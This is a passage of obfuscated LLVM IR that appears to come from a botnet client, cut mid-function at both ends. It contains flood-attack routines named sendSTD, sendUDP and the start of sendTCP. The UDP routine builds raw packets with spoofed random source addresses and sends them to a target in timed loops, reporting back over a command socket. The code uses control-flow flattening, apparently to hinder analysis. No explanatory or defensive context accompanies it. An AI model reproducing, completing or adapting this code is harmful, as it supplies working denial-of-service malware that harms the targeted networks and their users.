  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -571057076, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -571057076, label %39
    i32 -1758472007, label %49
    i32 -1351946874, label %64
    i32 -1857138054, label %67
    i32 -1887854924, label %68
    i32 -1784655855, label %71
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #2
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  %48 = select i1 %47, i32 -1758472007, i32 -1887854924
  store i32 %48, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %7, align 4
  %51 = load i8*, i8** %13, align 8
  %52 = call i64 @send(i32 %50, i8* %51, i64 65, i32 0)
  %53 = load i32, i32* %7, align 4
  %54 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %55 = call i32 @connect(i32 %53, %struct.sockaddr* %54, i32 16)
  %56 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %57 = sext i32 %56 to i64
  %58 = load i64, i64* %8, align 8
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = icmp sge i64 %57, %61
  %63 = select i1 %62, i32 -1351946874, i32 -1857138054
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #12
  unreachable

; <label>:67:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1887854924, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %11, align 4
  %70 = add i32 %69, 1
  store i32 %70, i32* %11, align 4
  store i32 -571057076, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %68, %67, %49, %39, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -427546805, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -427546805, label %first
    i32 -935310397, label %38
    i32 1325790490, label %42
    i32 1318236021, label %47
    i32 880666658, label %53
    i32 1171396758, label %54
    i32 521097848, label %61
    i32 -628167339, label %66
    i32 -133940113, label %69
    i32 452771085, label %77
    i32 697868123, label %78
    i32 1131321551, label %88
    i32 -1301843864, label %99
    i32 -283721574, label %103
    i32 -1655109798, label %107
    i32 82921505, label %112
    i32 -1832308583, label %113
    i32 1188306083, label %114
    i32 533091786, label %121
    i32 2069573985, label %125
    i32 -1873233007, label %128
    i32 -399464308, label %129
    i32 -1067447059, label %134
    i32 -403031148, label %137
    i32 -1488601230, label %143
    i32 -1577940825, label %146
    i32 652775648, label %147
    i32 539645939, label %152
    i32 -908231608, label %157
    i32 1460549723, label %161
    i32 1345275813, label %162
    i32 -944905203, label %168
    i32 -1770590043, label %208
    i32 -1402201895, label %210
    i32 1262850105, label %215
    i32 1929304068, label %240
    i32 1838708663, label %241
    i32 -702785708, label %254
    i32 690955128, label %256
    i32 -1999780778, label %261
    i32 78308558, label %288
    i32 2124506796, label %293
    i32 -1801984451, label %294
    i32 -1128841346, label %295
    i32 -725909922, label %302
    i32 1854628834, label %306
    i32 759106719, label %309
    i32 -891156927, label %311
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp eq i32 %.reload, 0
  %37 = select i1 %36, i32 -935310397, i32 1325790490
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  store i32 1318236021, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  store i32 1318236021, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 880666658, i32 1171396758
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  %60 = select i1 %59, i32 521097848, i32 -399464308
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 -133940113, i32 -628167339
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %13, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  %76 = select i1 %75, i32 452771085, i32 697868123
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %20, align 8
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i8*, i8** %20, align 8
  %84 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %83, i32 %84)
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %86 = load i32, i32* %11, align 4
  %87 = add nsw i32 %85, %86
  store i32 %87, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 1131321551, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %19, align 4
  %90 = load i8*, i8** %20, align 8
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %94 = call i64 @sendto(i32 %89, i8* %90, i64 %92, i32 0, %struct.sockaddr* %93, i32 16)
  %95 = load i32, i32* %22, align 4
  %96 = load i32, i32* %18, align 4
  %97 = icmp eq i32 %95, %96
  %98 = select i1 %97, i32 -1301843864, i32 1188306083
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %10, align 4
  %101 = icmp eq i32 %100, 0
  %102 = select i1 %101, i32 -283721574, i32 -1655109798
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %105, i16* %106, align 2
  store i32 -1655109798, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %109 = load i32, i32* %21, align 4
  %110 = icmp sgt i32 %108, %109
  %111 = select i1 %110, i32 82921505, i32 -1832308583
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  store i32 -1873233007, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 1131321551, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %22, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %22, align 4
  %117 = load i32, i32* %23, align 4
  %118 = load i32, i32* %15, align 4
  %119 = icmp eq i32 %117, %118
  %120 = select i1 %119, i32 533091786, i32 2069573985
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 %123)
  store i32 0, i32* %23, align 4
  store i32 1131321551, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %23, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %23, align 4
  store i32 1131321551, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %130, i32* %24, align 4
  %131 = load i32, i32* %24, align 4
  %132 = icmp ne i32 %131, 0
  %133 = select i1 %132, i32 -403031148, i32 -1067447059
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* @mainCommSock, align 4
  %136 = call i32 (i32, i8*, ...) @sockprintf(i32 %135, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i32 0, i32 0))
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %138 = load i32, i32* %24, align 4
  %139 = bitcast i32* %25 to i8*
  %140 = call i32 @setsockopt(i32 %138, i32 0, i32 3, i8* %139, i32 4) #2
  %141 = icmp slt i32 %140, 0
  %142 = select i1 %141, i32 -1488601230, i32 -1577940825
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* @mainCommSock, align 4
  %145 = call i32 (i32, i8*, ...) @sockprintf(i32 %144, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i32 0, i32 0))
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 50, i32* %26, align 4
  store i32 652775648, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %26, align 4
  %149 = add nsw i32 %148, -1
  store i32 %149, i32* %26, align 4
  %150 = icmp ne i32 %148, 0
  %151 = select i1 %150, i32 539645939, i32 -908231608
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %154 = call i32 @rand_cmwc()
  %155 = xor i32 %153, %154
  call void @srand(i32 %155) #2
  %156 = call i32 @rand() #2
  call void @init_rand(i32 %156)
  store i32 652775648, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32, i32* %12, align 4
  %159 = icmp eq i32 %158, 0
  %160 = select i1 %159, i32 1460549723, i32 1345275813
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 -944905203, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %12, align 4
  %164 = sub nsw i32 32, %163
  %165 = shl i32 1, %164
  %166 = sub nsw i32 %165, 1
  %167 = xor i32 %166, -1
  store i32 %167, i32* %27, align 4
  store i32 -944905203, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %13, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 28, %170
  store i64 %171, i64* %.reg2mem2
  %172 = call i8* @llvm.stacksave()
  store i8* %172, i8** %28, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %173 = alloca i8, i64 %.reload4, align 16
  store i8* %173, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %174 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %29, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = bitcast %struct.iphdr* %175 to i8*
  %177 = getelementptr i8, i8* %176, i64 20
  %178 = bitcast i8* %177 to %struct.udphdr*
  store %struct.udphdr* %178, %struct.udphdr** %30, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %181 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 4
  %183 = load i32, i32* %27, align 4
  %184 = call i32 @GetRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #13
  %186 = load i32, i32* %13, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 8, %187
  %189 = trunc i64 %188 to i32
  call void @makeIPPacket(%struct.iphdr* %179, i32 %182, i32 %185, i8 zeroext 17, i32 %189)
  %190 = load i32, i32* %13, align 4
  %191 = sext i32 %190 to i64
  %192 = add i64 8, %191
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #13
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 0
  %197 = bitcast %union.anon.2* %196 to %struct.anon.3*
  %198 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %197, i32 0, i32 2
  store i16 %194, i16* %198, align 2
  %199 = call i32 @rand_cmwc()
  %200 = trunc i32 %199 to i16
  %201 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %202 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.2* %202 to %struct.anon.3*
  %204 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %203, i32 0, i32 0
  store i16 %200, i16* %204, align 2
  %205 = load i32, i32* %10, align 4
  %206 = icmp eq i32 %205, 0
  %207 = select i1 %206, i32 -1770590043, i32 -1402201895
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = call i32 @rand_cmwc()
  store i32 1262850105, i32* %switchVar
  store i32 %209, i32* %.reg2mem10
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i32, i32* %10, align 4
  %212 = trunc i32 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #13
  %214 = zext i16 %213 to i32
  store i32 1262850105, i32* %switchVar
  store i32 %214, i32* %.reg2mem10
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %216 = trunc i32 %.reload11 to i16
  %217 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %218 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.2* %218 to %struct.anon.3*
  %220 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %219, i32 0, i32 1
  store i16 %216, i16* %220, align 2
  %221 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %222 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %221, i32 0, i32 0
  %223 = bitcast %union.anon.2* %222 to %struct.anon.3*
  %224 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %223, i32 0, i32 3
  store i16 0, i16* %224, align 2
  %225 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %226 = bitcast %struct.udphdr* %225 to i8*
  %227 = getelementptr inbounds i8, i8* %226, i64 8
  %228 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %227, i32 %228)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %229 = bitcast i8* %.reload8 to i16*
  %230 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 2
  %232 = load i16, i16* %231, align 2
  %233 = zext i16 %232 to i32
  %234 = call zeroext i16 @csum(i16* %229, i32 %233)
  %235 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 7
  store i16 %234, i16* %236, align 2
  %237 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %238 = load i32, i32* %11, align 4
  %239 = add nsw i32 %237, %238
  store i32 %239, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 1929304068, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 1838708663, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = load i32, i32* %24, align 4
  %243 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %244 = call i64 @sendto(i32 %242, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %243, i32 16)
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.2* %248 to %struct.anon.3*
  %250 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %249, i32 0, i32 0
  store i16 %246, i16* %250, align 2
  %251 = load i32, i32* %10, align 4
  %252 = icmp eq i32 %251, 0
  %253 = select i1 %252, i32 -702785708, i32 690955128
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = call i32 @rand_cmwc()
  store i32 -1999780778, i32* %switchVar
  store i32 %255, i32* %.reg2mem12
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i32, i32* %10, align 4
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #13
  %260 = zext i16 %259 to i32
  store i32 -1999780778, i32* %switchVar
  store i32 %260, i32* %.reg2mem12
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %262 = trunc i32 %.reload13 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 0
  %265 = bitcast %union.anon.2* %264 to %struct.anon.3*
  %266 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %265, i32 0, i32 1
  store i16 %262, i16* %266, align 2
  %267 = call i32 @rand_cmwc()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  %271 = load i32, i32* %27, align 4
  %272 = call i32 @GetRandomIP(i32 %271)
  %273 = call i32 @htonl(i32 %272) #13
  %274 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 8
  store i32 %273, i32* %275, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %276 = bitcast i8* %.reload6 to i16*
  %277 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 2
  %279 = load i16, i16* %278, align 2
  %280 = zext i16 %279 to i32
  %281 = call zeroext i16 @csum(i16* %276, i32 %280)
  %282 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 7
  store i16 %281, i16* %283, align 2
  %284 = load i32, i32* %32, align 4
  %285 = load i32, i32* %18, align 4
  %286 = icmp eq i32 %284, %285
  %287 = select i1 %286, i32 78308558, i32 -1128841346
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %290 = load i32, i32* %31, align 4
  %291 = icmp sgt i32 %289, %290
  %292 = select i1 %291, i32 2124506796, i32 -1801984451
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 759106719, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 1929304068, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %32, align 4
  %297 = add i32 %296, 1
  store i32 %297, i32* %32, align 4
  %298 = load i32, i32* %33, align 4
  %299 = load i32, i32* %15, align 4
  %300 = icmp eq i32 %298, %299
  %301 = select i1 %300, i32 -725909922, i32 1854628834
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %16, align 4
  %304 = mul nsw i32 %303, 1000
  %305 = call i32 @usleep(i32 %304)
  store i32 0, i32* %33, align 4
  store i32 1929304068, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i32, i32* %33, align 4
  %308 = add i32 %307, 1
  store i32 %308, i32* %33, align 4
  store i32 1929304068, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %310)
  store i32 -891156927, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %309, %306, %302, %295, %294, %293, %288, %261, %256, %254, %241, %240, %215, %210, %208, %168, %162, %161, %157, %152, %147, %146, %143, %137, %134, %129, %128, %125, %121, %114, %113, %112, %107, %103, %99, %88, %78, %77, %69, %66, %61, %54, %53, %47, %42, %38, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -812054196, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -812054196, label %first
    i32 1357012177, label %31
    i32 619204563, label %35
    i32 -344215953, label %40
    i32 -970572752, label %46
    i32 -1596343037, label %47
    i32 1713939823, label %54
    i32 -1427352418, label %57
    i32 -1062329529, label %63
    i32 1659690968, label %66
    i32 1565956921, label %70
    i32 -617318722, label %71
    i32 676778086, label %77
    i32 -145725868, label %125
    i32 1504342161, label %161
    i32 183623357, label %164
    i32 1971473510, label %168
    i32 -946899741, label %173
    i32 -585704920, label %181
    i32 540609427, label %186
    i32 -997124856, label %194
    i32 -1416417867, label %199
    i32 1327948941, label %207
    i32 -744811980, label %212
    i32 -176942430, label %220
    i32 -388325384, label %225
    i32 -660730552, label %233
    i32 -1378612397, label %237
    i32 1274879711, label %238
    i32 637889346, label %239
    i32 -248566659, label %240
    i32 197286442, label %241
    i32 -1425665389, label %243
    i32 -1828483290, label %244
    i32 1489572064, label %262
    i32 -525521251, label %264
    i32 -1733517534, label %269
    i32 -1362231636, label %293
    i32 1817394959, label %294
    i32 -1046236941, label %341
    i32 -615109558, label %346
    i32 1917871901, label %347
    i32 337073196, label %348
    i32 341525930, label %351
    i32 -806826396, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 1357012177, i32 619204563
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -344215953, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
